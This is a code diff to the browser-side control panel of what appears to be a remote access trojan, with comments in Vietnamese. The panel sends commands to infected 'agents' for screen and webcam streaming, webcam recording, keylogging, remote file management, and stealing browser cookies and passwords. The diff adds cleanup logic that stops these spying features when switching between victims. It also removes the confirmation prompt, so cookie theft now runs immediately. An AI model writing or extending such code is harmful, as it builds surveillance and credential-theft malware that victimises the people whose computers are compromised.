@@ -20,12 +20,43 @@ document.addEventListener('DOMContentLoaded', () => {
     if (typeof feather !== 'undefined') feather.replace();
 
     // =================================================================
+    // 0. HÀM CLEANUP: Tắt tính năng cũ trước khi đổi Agent
+    // =================================================================
+    function resetActiveFeatures() {
+        if (isWsConnected() && state.currentAgentId) {
+
+            if (state.currentView === 'files') {
+                sendWsMessage({ command: 'fs_cancel_upload' });
+            }
+
+            sendWsMessage({ command: 'stop_screen_stream' });
+            sendWsMessage({ command: 'stop_webcam_stream' });
+
+            if (state.webcamMode === 'record') {
+                sendWsMessage({ command: 'stop_webcam_record' });
+            }
+
+            const keylogToggle = $('#keylog-toggle');
+            if (keylogToggle && keylogToggle.checked) {
+                sendWsMessage({ command: 'stop_keylog' });
+            }
+        }
+
+        resetScreenUI();
+        clearWebcamStreamUI();
+        state.webcamMode = 'idle';
+    }
+
+    // =================================================================
     // 1. GÁN CÁC HÀM GLOBAL (WINDOW EXPORTS)
     // Để các thuộc tính onclick="..." trong HTML hoạt động
     // =================================================================
 
     // --- Agent & Network ---
     window.selectAgent = (agentId, hostname) => {
+        // Tắt tính năng cũ trước khi đổi agent
+        resetActiveFeatures();
+
         state.currentAgentId = agentId;
         console.log('[App] Selected agent:', agentId, hostname);
         
@@ -66,7 +97,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Stealer ---
     window.requestStealCookies = (browser) => {
-        if (confirm(`Steal Cookies from ${browser} using CDP Method (Will restart browser)?`)) sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
+        sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
     };
 
     window.requestStealPass = (browser) => {
@@ -444,7 +475,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const isNotStreaming = !$('#btn-start-stream').classList.contains('hidden');
             if (isNotStreaming && e.target.checked) {
                 e.preventDefault();
-                alert("Please start Live Stream first to enable Remote Control.");
                 return;
             }
             if (e.target.checked) {
@@ -658,13 +688,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- File Manager Events ---
     if ($('#btn-fs-go')) $('#btn-fs-go').onclick = () => {
+        if (!canUseAgentFeature()) return;
         const path = $('#fs-path-input').value;
         if (path) sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
     };
     if ($('#fs-path-input')) $('#fs-path-input').addEventListener("keypress", (event) => {
+        if (!canUseAgentFeature()) return;
         if (event.key === "Enter") $('#btn-fs-go').click();
     });
     if ($('#btn-fs-up')) $('#btn-fs-up').onclick = () => {
+        if (!canUseAgentFeature()) return;
         let p = state.currentPath;
         if (p.endsWith('\\') || p.endsWith('/')) p = p.slice(0, -1);
         const lastSlash = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
@@ -678,16 +711,19 @@ document.addEventListener('DOMContentLoaded', () => {
         else sendWsMessage({ command: 'fs_list', path: parent, context: 'view' });
     };
     if ($('#btn-fs-refresh')) $('#btn-fs-refresh').onclick = () => {
+        if (!canUseAgentFeature()) return;
         if (isWsConnected()) {
             sendWsMessage({ command: 'fs_drives' });
             sendWsMessage({ command: 'fs_list', path: state.currentPath, context: 'view' });
         }
     };
     if ($('#btn-fs-new-folder')) $('#btn-fs-new-folder').onclick = () => {
+        if (!canUseAgentFeature()) return;
         const name = prompt("Enter new folder name:");
         if (name) sendWsMessage({ command: 'fs_mkdir', path: state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name });
     };
     if ($('#btn-fs-new-file')) $('#btn-fs-new-file').onclick = () => {
+        if (!canUseAgentFeature()) return;
         const name = prompt("Enter new file name (e.g., text.txt):");
         if (name) {
             sendWsMessage({ command: 'fs_mkfile', path: state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name });
@@ -706,6 +742,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     if ($('#btn-fs-upload')) {
         $('#btn-fs-upload').onclick = () => {
+            if (!canUseAgentFeature()) return;
             if (state.uploadState.active) {
                 alert("Please wait for the current upload to finish.");
                 return;
